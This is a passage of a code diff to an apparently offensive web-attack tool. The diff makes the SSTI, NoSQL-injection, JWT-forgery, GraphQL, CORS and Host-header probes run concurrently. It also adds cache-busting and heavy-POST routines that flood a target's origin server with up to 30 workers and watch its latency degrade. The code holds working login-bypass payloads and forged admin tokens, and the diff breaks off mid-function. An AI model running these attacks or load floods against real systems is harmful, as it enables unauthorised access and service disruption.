@@ -1500,7 +1500,8 @@ async def phone_probe_attack(phone: str, duration: int, intensity: int, attack_i
 
 
 async def ssti_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str):
-    """Server-Side Template Injection (SSTI) arithmetic canary verification."""
+    """Server-Side Template Injection (SSTI) multi-worker concurrent arithmetic canary verification."""
+    import urllib.parse
     base = format_url(url).rstrip('/')
     canaries = [
         ("{{7*719}}", "5033", "Jinja2 / Twig / Nunjucks"),
@@ -1517,10 +1518,8 @@ async def ssti_attack(url: str, duration: int, intensity: int, threads: int, att
         f"{base}/?view="
     ]
     start_time = time.time()
-    idx = 0
     connector = aiohttp.TCPConnector(ssl=False)
     async with aiohttp.ClientSession(connector=connector) as session:
-        # Baseline check so we never false-positive if 5033 is already on the page
         baseline_text = ""
         try:
             async with session.get(base, timeout=aiohttp.ClientTimeout(total=4)) as b_resp:
@@ -1528,41 +1527,45 @@ async def ssti_attack(url: str, duration: int, intensity: int, threads: int, att
         except Exception:
             pass
 
-        while time.time() - start_time < duration and metrics["attacks_running"]:
-            expr, expected, engine = canaries[idx % len(canaries)]
-            ep_prefix = endpoints[(idx // len(canaries)) % len(endpoints)]
-            idx += 1
-            import urllib.parse
-            test_url = f"{ep_prefix}{urllib.parse.quote(expr)}"
-            t0 = time.time()
-            try:
-                async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=5)) as resp:
-                    body = await resp.text()
-                    elapsed = time.time() - t0
-                    await record_request_metric(resp.status < 500, elapsed, resp.status)
-                    if expected in body and expected not in baseline_text:
-                        await _broadcast_finding({
-                            "type": f"Server-Side Template Injection ({engine})",
-                            "severity": "Critical",
-                            "url": test_url,
-                            "payload": expr,
-                            "detail": f"Template expression '{expr}' was evaluated server-side to '{expected}', confirming {engine} template injection.",
-                            "evidence": f"HTTP {resp.status} — Evaluated output '{expected}' found in response body",
-                            "timestamp": datetime.now().isoformat(),
-                            "attack_id": attack_id
-                        })
-                        await manager.broadcast(json.dumps({
-                            "type": "log",
-                            "message": f"[SSTI] Evaluated {expr} -> {expected} ({engine}) at {test_url}",
-                            "level": "error"
-                        }))
-            except Exception:
-                await record_request_metric(False)
-            await asyncio.sleep(1.0 / max(intensity, 1))
+        async def worker(w_id: int):
+            idx = w_id
+            while time.time() - start_time < duration and metrics["attacks_running"]:
+                expr, expected, engine = canaries[idx % len(canaries)]
+                ep_prefix = endpoints[(idx // len(canaries)) % len(endpoints)]
+                idx += 1
+                test_url = f"{ep_prefix}{urllib.parse.quote(expr)}"
+                t0 = time.time()
+                try:
+                    async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=5)) as resp:
+                        body = await resp.text()
+                        elapsed = time.time() - t0
+                        await record_request_metric(resp.status < 500, elapsed, resp.status)
+                        if expected in body and expected not in baseline_text:
+                            await _broadcast_finding({
+                                "type": f"Server-Side Template Injection ({engine})",
+                                "severity": "Critical",
+                                "url": test_url,
+                                "payload": expr,
+                                "detail": f"Template expression '{expr}' was evaluated server-side to '{expected}', confirming {engine} template injection.",
+                                "evidence": f"HTTP {resp.status} — Evaluated output '{expected}' found in response body",
+                                "timestamp": datetime.now().isoformat(),
+                                "attack_id": attack_id
+                            })
+                            await manager.broadcast(json.dumps({
+                                "type": "log",
+                                "message": f"[SSTI] Evaluated {expr} -> {expected} ({engine}) at {test_url}",
+                                "level": "error"
+                            }))
+                except Exception:
+                    await record_request_metric(False)
+                await asyncio.sleep(1.0 / max(intensity, 1))
+
+        tasks = [asyncio.create_task(worker(i)) for i in range(min(max(threads, 1), 15))]
+        await asyncio.gather(*tasks)
 
 
 async def nosql_injection_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str):
-    """NoSQL Operator ($ne, $gt, $regex) & Filter Injection Auditor."""
+    """NoSQL Operator ($ne, $gt, $regex) multi-worker concurrent Filter Injection Auditor."""
     base = format_url(url).rstrip('/')
     json_payloads = [
         {"username": {"$ne": None}, "password": {"$ne": None}},
@@ -1577,82 +1580,79 @@ async def nosql_injection_attack(url: str, duration: int, intensity: int, thread
     ]
     post_endpoints = [f"{base}/api/nosql/login", f"{base}/api/login", f"{base}/login"]
     start_time = time.time()
-    idx = 0
     connector = aiohttp.TCPConnector(ssl=False)
     async with aiohttp.ClientSession(connector=connector) as session:
-        while time.time() - start_time < duration and metrics["attacks_running"]:
-            payload = json_payloads[idx % len(json_payloads)]
-            post_ep = post_endpoints[idx % len(post_endpoints)]
-            q_ep    = query_probes[idx % len(query_probes)]
-            idx += 1
+        async def worker(w_id: int):
+            idx = w_id
+            while time.time() - start_time < duration and metrics["attacks_running"]:
+                payload = json_payloads[idx % len(json_payloads)]
+                post_ep = post_endpoints[idx % len(post_endpoints)]
+                q_ep    = query_probes[idx % len(query_probes)]
+                idx += 1
 
-            # 1. JSON Operator POST probe
-            t0 = time.time()
-            try:
-                async with session.post(
-                    post_ep,
-                    json=payload,
-                    timeout=aiohttp.ClientTimeout(total=5)
-                ) as resp:
-                    body = await resp.text()
-                    elapsed = time.time() - t0
-                    await record_request_metric(resp.status < 500, elapsed, resp.status)
-                    body_lower = body.lower()
-                    if resp.status == 200 and any(k in body_lower for k in ("authenticated", "token", "superuser", "welcome")):
-                        await _broadcast_finding({
-                            "type": "NoSQL Operator Authentication Bypass",
-                            "severity": "Critical",
-                            "url": post_ep,
-                            "payload": json.dumps(payload),
-                            "detail": "Authentication endpoint accepted MongoDB/NoSQL comparison operators ($ne / $gt) in JSON body without type sanitization.",
-                            "evidence": f"HTTP 200 | Response: {body[:160]}",
-                            "timestamp": datetime.now().isoformat(),
-                            "attack_id": attack_id
-                        })
-                        await manager.broadcast(json.dumps({
-                            "type": "log",
-                            "message": f"[NoSQLi] Operator bypass confirmed on {post_ep}",
-                            "level": "error"
-                        }))
-                    elif any(err in body_lower for err in ("mongoerror", "casterror", "$where", "bson", "couchdb")):
-                        await _broadcast_finding({
-                            "type": "NoSQL Error / Query Structure Leakage",
-                            "severity": "High",
-                            "url": post_ep,
-                            "payload": json.dumps(payload),
-                            "detail": "Database driver leaked internal NoSQL parser/operator exception details.",
-                            "evidence": body[:160],
-                            "timestamp": datetime.now().isoformat(),
-                            "attack_id": attack_id
-                        })
-            except Exception:
-                await record_request_metric(False)
+                t0 = time.time()
+                try:
+                    async with session.post(
+                        post_ep,
+                        json=payload,
+                        timeout=aiohttp.ClientTimeout(total=5)
+                    ) as resp:
+                        body = await resp.text()
+                        elapsed = time.time() - t0
+                        await record_request_metric(resp.status < 500, elapsed, resp.status)
+                        body_lower = body.lower()
+                        if resp.status == 200 and any(k in body_lower for k in ("authenticated", "token", "superuser", "welcome")):
+                            await _broadcast_finding({
+                                "type": "NoSQL Operator Authentication Bypass",
+                                "severity": "Critical",
+                                "url": post_ep,
+                                "payload": json.dumps(payload),
+                                "detail": "Authentication endpoint accepted MongoDB/NoSQL comparison operators ($ne / $gt) in JSON body without type sanitization.",
+                                "evidence": f"HTTP 200 | Response: {body[:160]}",
+                                "timestamp": datetime.now().isoformat(),
+                                "attack_id": attack_id
+                            })
+                        elif any(err in body_lower for err in ("mongoerror", "casterror", "$where", "bson", "couchdb")):
+                            await _broadcast_finding({
+                                "type": "NoSQL Error / Query Structure Leakage",
+                                "severity": "High",
+                                "url": post_ep,
+                                "payload": json.dumps(payload),
+                                "detail": "Database driver leaked internal NoSQL parser/operator exception details.",
+                                "evidence": body[:160],
+                                "timestamp": datetime.now().isoformat(),
+                                "attack_id": attack_id
+                            })
+                except Exception:
+                    await record_request_metric(False)
 
-            # 2. URL Query Operator GET probe
-            t1 = time.time()
-            try:
-                async with session.get(q_ep, timeout=aiohttp.ClientTimeout(total=5)) as q_resp:
-                    q_body = await q_resp.text()
-                    await record_request_metric(q_resp.status < 500, time.time() - t1, q_resp.status)
-                    if any(err in q_body.lower() for err in ("mongoerror", "casterror", "bson")):
-                        await _broadcast_finding({
-                            "type": "NoSQL Query Parameter Operator Injection",
-                            "severity": "High",
-                            "url": q_ep,
-                            "payload": q_ep.split("?", 1)[-1],
-                            "detail": "Query parameter array/object notation triggered a NoSQL driver error.",
-                            "evidence": q_body[:160],
-                            "timestamp": datetime.now().isoformat(),
-                            "attack_id": attack_id
-                        })
-            except Exception:
-                await record_request_metric(False)
+                t1 = time.time()
+                try:
+                    async with session.get(q_ep, timeout=aiohttp.ClientTimeout(total=5)) as q_resp:
+                        q_body = await q_resp.text()
+                        await record_request_metric(q_resp.status < 500, time.time() - t1, q_resp.status)
+                        if any(err in q_body.lower() for err in ("mongoerror", "casterror", "bson")):
+                            await _broadcast_finding({
+                                "type": "NoSQL Query Parameter Operator Injection",
+                                "severity": "High",
+                                "url": q_ep,
+                                "payload": q_ep.split("?", 1)[-1],
+                                "detail": "Query parameter array/object notation triggered a NoSQL driver error.",
+                                "evidence": q_body[:160],
+                                "timestamp": datetime.now().isoformat(),
+                                "attack_id": attack_id
+                            })
+                except Exception:
+                    await record_request_metric(False)
 
-            await asyncio.sleep(1.0 / max(intensity, 1))
+                await asyncio.sleep(1.0 / max(intensity, 1))
+
+        tasks = [asyncio.create_task(worker(i)) for i in range(min(max(threads, 1), 15))]
+        await asyncio.gather(*tasks)
 
 
 async def jwt_audit_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str):
-    """JWT Signature Verification ('alg: none', Tampered Signature, Weak HMAC Key) Auditor."""
+    """JWT Signature Verification ('alg: none', Tampered Signature, Weak HMAC Key) Multi-Worker Auditor."""
     import base64
     import hmac
     import hashlib
@@ -1664,11 +1664,8 @@ async def jwt_audit_attack(url: str, duration: int, intensity: int, threads: int
     hdr_hs256 = _b64u(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
     claims = _b64u(json.dumps({"sub": "admin", "role": "admin", "iat": int(time.time())}).encode())
 
-    # 1. alg:none token
     tok_none = f"{hdr_none}.{claims}."
-    # 2. Tampered signature token
     tok_tampered = f"{hdr_hs256}.{claims}.tampered_signature_canary_00"
-    # 3. Weak default secret ('secret') HMAC-SHA256 token
     sig_weak = _b64u(hmac.new(b"secret", f"{hdr_hs256}.{claims}".encode(), hashlib.sha256).digest())
     tok_weak = f"{hdr_hs256}.{claims}.{sig_weak}"
 
@@ -1681,120 +1678,116 @@ async def jwt_audit_attack(url: str, duration: int, intensity: int, threads: int
     endpoints = [f"{base}/api/auth/verify", f"{base}/api/profile", f"{base}/api/me", f"{base}/api/users/1"]
 
     start_time = time.time()
-    idx = 0
     connector = aiohttp.TCPConnector(ssl=False)
     async with aiohttp.ClientSession(connector=connector) as session:
-        while time.time() - start_time < duration and metrics["attacks_running"]:
-            label, token, sev, detail = probes[idx % len(probes)]
-            ep = endpoints[(idx // len(probes)) % len(endpoints)]
-            idx += 1
-            t0 = time.time()
-            try:
-                async with session.get(
-                    ep,
-                    headers={"Authorization": f"Bearer {token}"},
-                    timeout=aiohttp.ClientTimeout(total=5)
-                ) as resp:
-                    body = await resp.text()
-                    elapsed = time.time() - t0
-                    await record_request_metric(resp.status < 500, elapsed, resp.status)
-                    if resp.status == 200 and any(k in body.lower() for k in ("authenticated", "principal", "admin", "role")):
-                        await _broadcast_finding({
-                            "type": f"JWT Vulnerability: {label}",
-                            "severity": sev,
-                            "url": ep,
-                            "payload": f"Authorization: Bearer {token[:48]}...",
-                            "detail": detail,
-                            "evidence": f"HTTP 200 | Response: {body[:160]}",
-                            "timestamp": datetime.now().isoformat(),
-                            "attack_id": attack_id
-                        })
-                        await manager.broadcast(json.dumps({
-                            "type": "log",
-                            "message": f"[JWT Audit] {label} accepted at {ep}",
-                            "level": "error"
-                        }))
-            except Exception:
-                await record_request_metric(False)
-            await asyncio.sleep(1.0 / max(intensity, 1))
+        async def worker(w_id: int):
+            idx = w_id
+            while time.time() - start_time < duration and metrics["attacks_running"]:
+                label, token, sev, detail = probes[idx % len(probes)]
+                ep = endpoints[(idx // len(probes)) % len(endpoints)]
+                idx += 1
+                t0 = time.time()
+                try:
+                    async with session.get(
+                        ep,
+                        headers={"Authorization": f"Bearer {token}"},
+                        timeout=aiohttp.ClientTimeout(total=5)
+                    ) as resp:
+                        body = await resp.text()
+                        elapsed = time.time() - t0
+                        await record_request_metric(resp.status < 500, elapsed, resp.status)
+                        if resp.status == 200 and any(k in body.lower() for k in ("authenticated", "principal", "admin", "role")):
+                            await _broadcast_finding({
+                                "type": f"JWT Vulnerability: {label}",
+                                "severity": sev,
+                                "url": ep,
+                                "payload": f"Authorization: Bearer {token[:48]}...",
+                                "detail": detail,
+                                "evidence": f"HTTP 200 | Response: {body[:160]}",
+                                "timestamp": datetime.now().isoformat(),
+                                "attack_id": attack_id
+                            })
+                except Exception:
+                    await record_request_metric(False)
+                await asyncio.sleep(1.0 / max(intensity, 1))
+
+        tasks = [asyncio.create_task(worker(i)) for i in range(min(max(threads, 1), 15))]
+        await asyncio.gather(*tasks)
 
 
 async def graphql_audit_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str):
-    """GraphQL Schema Introspection & Query Batching Posture Auditor."""
+    """GraphQL Schema Introspection & Query Batching Multi-Worker Auditor."""
     base = format_url(url).rstrip('/')
     endpoints = [f"{base}/graphql", f"{base}/api/graphql", f"{base}/v1/graphql", f"{base}/query"]
     introspection_q = {"query": "query IntrospectionAudit { __schema { queryType { name } mutationType { name } types { name kind } } }"}
     batch_q = [{"query": "{ __typename }"}, {"query": "{ __typename }"}, {"query": "{ __typename }"}]
 
     start_time = time.time()
-    idx = 0
     connector = aiohttp.TCPConnector(ssl=False)
     async with aiohttp.ClientSession(connector=connector) as session:
-        while time.time() - start_time < duration and metrics["attacks_running"]:
-            ep = endpoints[idx % len(endpoints)]
-            idx += 1
+        async def worker(w_id: int):
+            idx = w_id
+            while time.time() - start_time < duration and metrics["attacks_running"]:
+                ep = endpoints[idx % len(endpoints)]
+                idx += 1
 
-            # 1. Introspection check
-            t0 = time.time()
-            try:
-                async with session.post(
-                    ep,
-                    json=introspection_q,
-                    headers={"Content-Type": "application/json"},
-                    timeout=aiohttp.ClientTimeout(total=5)
-                ) as resp:
-                    body = await resp.text()
-                    elapsed = time.time() - t0
-                    await record_request_metric(resp.status < 500, elapsed, resp.status)
-                    if resp.status == 200 and "__schema" in body:
-                        await _broadcast_finding({
-                            "type": "GraphQL Introspection Enabled in Production",
-                            "severity": "High",
-                            "url": ep,
-                            "payload": "POST {\"query\": \"{ __schema { types { name kind } } }\"}",
-                            "detail": "GraphQL endpoint allows unauthenticated schema introspection, exposing all internal object types, fields, and mutations.",
-                            "evidence": body[:180],
-                            "timestamp": datetime.now().isoformat(),
-                            "attack_id": attack_id
-                        })
-                        await manager.broadcast(json.dumps({
-                            "type": "log",
-                            "message": f"[GraphQL Audit] Full schema introspection exposed at {ep}",
-                            "level": "error"
-                        }))
-            except Exception:
-                await record_request_metric(False)
+                t0 = time.time()
+                try:
+                    async with session.post(
+                        ep,
+                        json=introspection_q,
+                        headers={"Content-Type": "application/json"},
+                        timeout=aiohttp.ClientTimeout(total=5)
+                    ) as resp:
+                        body = await resp.text()
+                        elapsed = time.time() - t0
+                        await record_request_metric(resp.status < 500, elapsed, resp.status)
+                        if resp.status == 200 and "__schema" in body:
+                            await _broadcast_finding({
+                                "type": "GraphQL Introspection Enabled in Production",
+                                "severity": "High",
+                                "url": ep,
+                                "payload": "POST {\"query\": \"{ __schema { types { name kind } } }\"}",
+                                "detail": "GraphQL endpoint allows unauthenticated schema introspection, exposing all internal object types, fields, and mutations.",
+                                "evidence": body[:180],
+                                "timestamp": datetime.now().isoformat(),
+                                "attack_id": attack_id
+                            })
+                except Exception:
+                    await record_request_metric(False)
 
-            # 2. Query Batching check
-            t1 = time.time()
-            try:
-                async with session.post(
-                    ep,
-                    json=batch_q,
-                    headers={"Content-Type": "application/json"},
-                    timeout=aiohttp.ClientTimeout(total=5)
-                ) as b_resp:
-                    b_body = await b_resp.text()
-                    await record_request_metric(b_resp.status < 500, time.time() - t1, b_resp.status)
-                    if b_resp.status == 200 and b_body.strip().startswith("[") and "__typename" in b_body:
-                        await _broadcast_finding({
-                            "type": "GraphQL Array Query Batching Allowed",
-                            "severity": "Medium",
-                            "url": ep,
-                            "payload": "POST [{\"query\": \"{ __typename }\"}, ...]",
-                            "detail": "GraphQL server executes batched JSON arrays of queries in a single HTTP request, enabling rate-limit amplification.",
-                            "evidence": b_body[:160],
-                            "timestamp": datetime.now().isoformat(),
-                            "attack_id": attack_id
-                        })
-            except Exception:
-                await record_request_metric(False)
+                t1 = time.time()
+                try:
+                    async with session.post(
+                        ep,
+                        json=batch_q,
+                        headers={"Content-Type": "application/json"},
+                        timeout=aiohttp.ClientTimeout(total=5)
+                    ) as b_resp:
+                        b_body = await b_resp.text()
+                        await record_request_metric(b_resp.status < 500, time.time() - t1, b_resp.status)
+                        if b_resp.status == 200 and b_body.strip().startswith("[") and "__typename" in b_body:
+                            await _broadcast_finding({
+                                "type": "GraphQL Array Query Batching Allowed",
+                                "severity": "Medium",
+                                "url": ep,
+                                "payload": "POST [{\"query\": \"{ __typename }\"}, ...]",
+                                "detail": "GraphQL server executes batched JSON arrays of queries in a single HTTP request, enabling rate-limit amplification.",
+                                "evidence": b_body[:160],
+                                "timestamp": datetime.now().isoformat(),
+                                "attack_id": attack_id
+                            })
+                except Exception:
+                    await record_request_metric(False)
 
-            await asyncio.sleep(1.0 / max(intensity, 1))
+                await asyncio.sleep(1.0 / max(intensity, 1))
+
+        tasks = [asyncio.create_task(worker(i)) for i in range(min(max(threads, 1), 15))]
+        await asyncio.gather(*tasks)
 
 
 async def cors_audit_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str):
-    """Deep CORS Origin Reflection, Null-Origin & Pre-Flight Trust Auditor."""
+    """Deep CORS Origin Reflection, Null-Origin & Pre-Flight Multi-Worker Trust Auditor."""
     base = format_url(url).rstrip('/')
     host = re.sub(r'^https?://', '', base).split('/')[0].split(':')[0]
     test_origins = [
@@ -1805,53 +1798,52 @@ async def cors_audit_attack(url: str, duration: int, intensity: int, threads: in
         (f"http://{host}", "Insecure HTTP Origin Trust"),
     ]
     start_time = time.time()
-    idx = 0
     connector = aiohttp.TCPConnector(ssl=False)
     async with aiohttp.ClientSession(connector=connector) as session:
-        while time.time() - start_time < duration and metrics["attacks_running"]:
-            origin_val, label = test_origins[idx % len(test_origins)]
-            method = "OPTIONS" if idx % 2 == 1 else "GET"
-            idx += 1
-            t0 = time.time()
-            try:
-                async with session.request(
-                    method,
-                    base,
-                    headers={
-                        "Origin": origin_val,
-                        "Access-Control-Request-Method": "POST",
-                        "Access-Control-Request-Headers": "Authorization, Content-Type"
-                    },
-                    timeout=aiohttp.ClientTimeout(total=5)
-                ) as resp:
-                    elapsed = time.time() - t0
-                    await record_request_metric(resp.status < 500, elapsed, resp.status)
-                    acao = resp.headers.get("Access-Control-Allow-Origin", "")
-                    acac = resp.headers.get("Access-Control-Allow-Credentials", "").lower()
-                    if acao and (acao == origin_val or acao == "*"):
-                        sev = "Critical" if (acao == origin_val and acac == "true") else "High"
-                        await _broadcast_finding({
-                            "type": f"CORS Misconfiguration: {label}",
-                            "severity": sev,
-                            "url": base,
-                            "payload": f"{method} with Origin: {origin_val}",
-                            "detail": f"Server responded with Access-Control-Allow-Origin: {acao} and Allow-Credentials: {acac or 'false'} for {label}.",
-                            "evidence": f"HTTP {resp.status} ({method}) | ACAO: {acao} | ACAC: {acac or 'absent'}",
-                            "timestamp": datetime.now().isoformat(),
-                            "attack_id": attack_id
-                        })
-                        await manager.broadcast(json.dumps({
-                            "type": "log",
-                            "message": f"[CORS Audit] {label} confirmed ({method} -> ACAO: {acao})",
-                            "level": "warning"
-                        }))
-            except Exception:
-                await record_request_metric(False)
-            await asyncio.sleep(1.0 / max(intensity, 1))
+        async def worker(w_id: int):
+            idx = w_id
+            while time.time() - start_time < duration and metrics["attacks_running"]:
+                origin_val, label = test_origins[idx % len(test_origins)]
+                method = "OPTIONS" if idx % 2 == 1 else "GET"
+                idx += 1
+                t0 = time.time()
+                try:
+                    async with session.request(
+                        method,
+                        base,
+                        headers={
+                            "Origin": origin_val,
+                            "Access-Control-Request-Method": "POST",
+                            "Access-Control-Request-Headers": "Authorization, Content-Type"
+                        },
+                        timeout=aiohttp.ClientTimeout(total=5)
+                    ) as resp:
+                        elapsed = time.time() - t0
+                        await record_request_metric(resp.status < 500, elapsed, resp.status)
+                        acao = resp.headers.get("Access-Control-Allow-Origin", "")
+                        acac = resp.headers.get("Access-Control-Allow-Credentials", "").lower()
+                        if acao and (acao == origin_val or acao == "*"):
+                            sev = "Critical" if (acao == origin_val and acac == "true") else "High"
+                            await _broadcast_finding({
+                                "type": f"CORS Misconfiguration: {label}",
+                                "severity": sev,
+                                "url": base,
+                                "payload": f"{method} with Origin: {origin_val}",
+                                "detail": f"Server responded with Access-Control-Allow-Origin: {acao} and Allow-Credentials: {acac or 'false'} for {label}.",
+                                "evidence": f"HTTP {resp.status} ({method}) | ACAO: {acao} | ACAC: {acac or 'absent'}",
+                                "timestamp": datetime.now().isoformat(),
+                                "attack_id": attack_id
+                            })
+                except Exception:
+                    await record_request_metric(False)
+                await asyncio.sleep(1.0 / max(intensity, 1))
+
+        tasks = [asyncio.create_task(worker(i)) for i in range(min(max(threads, 1), 15))]
+        await asyncio.gather(*tasks)
 
 
 async def host_header_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str):
-    """Host Header Injection, Password Reset Poisoning & Cache Poisoning Auditor."""
+    """Host Header Injection, Password Reset Poisoning & Cache Poisoning Multi-Worker Auditor."""
     base = format_url(url).rstrip('/')
     canary_host = "canary-host-audit.invalid"
     header_variants = [
@@ -1862,46 +1854,380 @@ async def host_header_attack(url: str, duration: int, intensity: int, threads: i
     ]
     paths = ["/api/reset-password", "/", "/login", "/redirect"]
     start_time = time.time()
-    idx = 0
     connector = aiohttp.TCPConnector(ssl=False)
     async with aiohttp.ClientSession(connector=connector) as session:
-        while time.time() - start_time < duration and metrics["attacks_running"]:
-            hdr = header_variants[idx % len(header_variants)]
-            path = paths[(idx // len(header_variants)) % len(paths)]
-            idx += 1
-            target_ep = f"{base}{path}"
-            t0 = time.time()
-            try:
-                async with session.get(
-                    target_ep,
-                    headers=hdr,
-                    allow_redirects=False,
-                    timeout=aiohttp.ClientTimeout(total=5)
-                ) as resp:
-                    body = await resp.text()
-                    elapsed = time.time() - t0
-                    await record_request_metric(resp.status < 500, elapsed, resp.status)
-                    hdr_str = str(dict(resp.headers))
-                    if canary_host in body or canary_host in hdr_str:
-                        hdr_name = list(hdr.keys())[0]
-                        await _broadcast_finding({
-                            "type": f"Host Header Injection ({hdr_name})",
-                            "severity": "High",
-                            "url": target_ep,
-                            "payload": f"{hdr_name}: {canary_host}",
-                            "detail": f"Application trusted unvalidated '{hdr_name}' header and reflected '{canary_host}' into generated links or response headers (Password Reset / Cache Poisoning risk).",
-                            "evidence": f"HTTP {resp.status} | Reflected '{canary_host}' in response",
-                            "timestamp": datetime.now().isoformat(),
-                            "attack_id": attack_id
-                        })
+        async def worker(w_id: int):
+            idx = w_id
+            while time.time() - start_time < duration and metrics["attacks_running"]:
+                hdr = header_variants[idx % len(header_variants)]
+                path = paths[(idx // len(header_variants)) % len(paths)]
+                idx += 1
+                target_ep = f"{base}{path}"
+                t0 = time.time()
+                try:
+                    async with session.get(
+                        target_ep,
+                        headers=hdr,
+                        allow_redirects=False,
+                        timeout=aiohttp.ClientTimeout(total=5)
+                    ) as resp:
+                        body = await resp.text()
+                        elapsed = time.time() - t0
+                        await record_request_metric(resp.status < 500, elapsed, resp.status)
+                        hdr_str = str(dict(resp.headers))
+                        if canary_host in body or canary_host in hdr_str:
+                            hdr_name = list(hdr.keys())[0]
+                            await _broadcast_finding({
+                                "type": f"Host Header Injection ({hdr_name})",
+                                "severity": "High",
+                                "url": target_ep,
+                                "payload": f"{hdr_name}: {canary_host}",
+                                "detail": f"Application trusted unvalidated '{hdr_name}' header and reflected '{canary_host}' into generated links or response headers (Password Reset / Cache Poisoning risk).",
+                                "evidence": f"HTTP {resp.status} | Reflected '{canary_host}' in response",
+                                "timestamp": datetime.now().isoformat(),
+                                "attack_id": attack_id
+                            })
+                except Exception:
+                    await record_request_metric(False)
+                await asyncio.sleep(1.0 / max(intensity, 1))
+
+        tasks = [asyncio.create_task(worker(i)) for i in range(min(max(threads, 1), 15))]
+        await asyncio.gather(*tasks)
+
+
+async def cache_bust_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str):
+    """High-Concurrency Dynamic Cache-Bypass & Origin Server Stress Benchmark."""
+    base = format_url(url).rstrip('/')
+    routes = ["/", "/search", "/api/products", "/login"]
+    start_time = time.time()
+    unthrottled_logged = False
+    degradation_logged = False
+    baseline_rtt = None
+
+    timeout_cfg = aiohttp.ClientTimeout(total=3.5, sock_connect=1.5, sock_read=2.5)
+    connector = aiohttp.TCPConnector(ssl=False, limit=100)
+    async with aiohttp.ClientSession(connector=connector, timeout=timeout_cfg) as session:
+        try:
+            t_b = time.time()
+            async with session.get(base) as b_resp:
+                baseline_rtt = max(time.time() - t_b, 0.002)
+        except Exception:
+            baseline_rtt = 0.015
+
+        async def worker(w_id: int):
+            nonlocal unthrottled_logged, degradation_logged
+            seq = 0
+            while time.time() - start_time < duration and metrics["attacks_running"]:
+                seq += 1
+                nonce = f"{int(time.time()*1000000)}_{w_id}_{seq}_{random.randint(1000,9999)}"
+                route = routes[seq % len(routes)]
+                target_ep = f"{base}{route}?_cb={nonce}&q=bench_{nonce}&id={random.randint(1, 500)}"
+                headers = {
+                    "Cache-Control": "no-cache, no-store, must-revalidate, max-age=0",
+                    "Pragma": "no-cache",
+                    "Accept-Encoding": "identity",
+                    "User-Agent": f"CyberStrike-CacheBust/{w_id}.{seq}"
+                }
+                t0 = time.time()
+                try:
+                    async with session.get(target_ep, headers=headers) as resp:
+                        await resp.read()
+                        req_time = time.time() - t0
+                        await record_request_metric(resp.status < 500, req_time, resp.status)
+
                         await manager.broadcast(json.dumps({
-                            "type": "log",
-                            "message": f"[Host Header] Unvalidated {hdr_name} reflected at {target_ep}",
-                            "level": "error"
+                            "type": "metrics",
+                            "data": {
+                                "total_requests": metrics["total_requests"],
+                                "successful_requests": metrics["successful_requests"],
+                                "failed_requests": metrics["failed_requests"],
+                                "response_time": req_time,
+                                "current_attack": "Cache-Bust Stress",
+                                "attack_id": attack_id
+                            }
                         }))
-            except Exception:
-                await record_request_metric(False)
-            await asyncio.sleep(1.0 / max(intensity, 1))
+
+                        cache_hdr = (
+                            resp.headers.get("CF-Cache-Status")
+                            or resp.headers.get("X-Cache")
+                            or resp.headers.get("X-Proxy-Cache")
+                            or "BYPASS/ORIGIN"
+                        )
+                        if not unthrottled_logged and seq >= 4 and resp.status == 200:
+                            unthrottled_logged = True
+                            await _broadcast_finding({
+                                "type": "Unthrottled Cache-Bypass Origin Load",
+                                "severity": "Medium",
+                                "url": f"{base}{route}",
+                                "payload": "GET ?_cb=<nonce> + Cache-Control: no-cache, no-store",
+                                "detail": f"Origin server processed concurrent cache-busting query strings without CDN shielding or HTTP 429 rate limiting (Cache Status: {cache_hdr}).",
+                                "evidence": f"HTTP {resp.status} | Cache-Status: {cache_hdr} | Origin RTT: {req_time*1000:.1f} ms",
+                                "timestamp": datetime.now().isoformat(),
+                                "attack_id": attack_id
+                            })
+
+                        if not degradation_logged and baseline_rtt and req_time > max(baseline_rtt * 3.5, 0.12):
+                            degradation_logged = True
+                            await _broadcast_finding({
+                                "type": "Origin Latency Degradation Under Cache-Bust Stress",
+                                "severity": "High",
+                                "url": f"{base}{route}",
+                                "payload": f"{min(threads, 30)} concurrent cache-bypass workers",
+                                "detail": f"Origin response latency spiked from {baseline_rtt*1000:.1f} ms baseline to {req_time*1000:.1f} ms under uncached dynamic query load.",
+                                "evidence": f"Baseline RTT: {baseline_rtt*1000:.1f} ms -> Stressed RTT: {req_time*1000:.1f} ms",
+                                "timestamp": datetime.now().isoformat(),
+                                "attack_id": attack_id
+                            })
+                except Exception:
+                    await record_request_metric(False)
+
+                sleep_delay = 1.0 / max(intensity, 1)
+                await asyncio.sleep(sleep_delay + random.uniform(0.0, 0.01))
+
+        tasks = [asyncio.create_task(worker(i)) for i in range(min(max(threads, 1), 30))]
+        await asyncio.gather(*tasks)
+
+
+async def heavy_post_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str):
+    """High-Concurrency Heavy JSON & Form Body Parser Stress Benchmark."""
+    base = format_url(url).rstrip('/')
+    endpoints = [f"{base}/api/comments", f"{base}/api/render", f"{base}/login", f"{base}/"]
+    large_blob = "X" * 4096
+    nested_json = {
+        "comment": f"stress_bench_{large_blob[:256]}",
+        "metadata": {
+            "records": [{"idx": i, "blob": large_blob[:128], "tags": ["a", "b", "c", "d"]} for i in range(20)]
+        }
+    }
+    start_time = time.time()
+    finding_logged = False
+    timeout_cfg = aiohttp.ClientTimeout(total=4.0, sock_connect=1.5, sock_read=3.0)
+    connector = aiohttp.TCPConnector(ssl=False, limit=100)
+
+    async with aiohttp.ClientSession(connector=connector, timeout=timeout_cfg) as session:
+        async def worker(w_id: int):
+            nonlocal finding_logged
+            seq = 0
+            while time.time() - start_time < duration and metrics["attacks_running"]:
+                seq += 1
+                ep = endpoints[(w_id + seq) % len(endpoints)]
+                t0 = time.time()
+                try:
+                    async with session.post(
+                        ep,
+                        json=nested_json,
+                        headers={"Content-Type": "application/json", "X-Stress-Worker": str(w_id)}
+                    ) as resp:
+                        await resp.read()
+                        req_time = time.time() - t0
+                        await record_request_metric(resp.status < 500, req_time, resp.status)
+
+                        await manager.broadcast(json.dumps({
+                            "type": "metrics",
+                            "data": {
+                                "total_requests": metrics["total_requests"],
+                                "successful_requests": metrics["successful_requests"],
+                                "failed_requests": metrics["failed_requests"],
+                                "response_time": req_time,
